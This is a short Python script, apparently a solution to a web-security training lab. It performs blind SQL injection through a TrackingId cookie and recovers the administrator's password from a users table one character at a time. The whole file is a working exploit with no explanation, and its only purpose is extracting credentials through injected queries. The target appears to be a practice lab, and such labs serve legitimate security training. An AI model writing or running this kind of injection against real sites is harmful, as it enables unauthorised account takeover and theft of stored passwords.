import requests as req
import string

url = 'https://0a7a00fc0371f81f80946c5b001e000e.web-security-academy.net/'
pwd = ''
printable_text = string.printable

for i in range(1,21):
    for j in printable_text:
        cookies = {
            "TrackingId": f"HFl0oo5dUWYzaB3O' AND (SELECT SUBSTRING(password,{i},1) from users where username = 'administrator') = '{j}",
            "session": "hs85wC395xQLa033MDIyx0wyHSwmr5aI"
            
        }
        print(f"try {j}, res: ", end='')
        res =  req.get(url, cookies=cookies)

        if "Welcome" in res.text:
            pwd = pwd + j
            print(pwd)
            break
        else:
            print("nope\n")
            continue
print(pwd)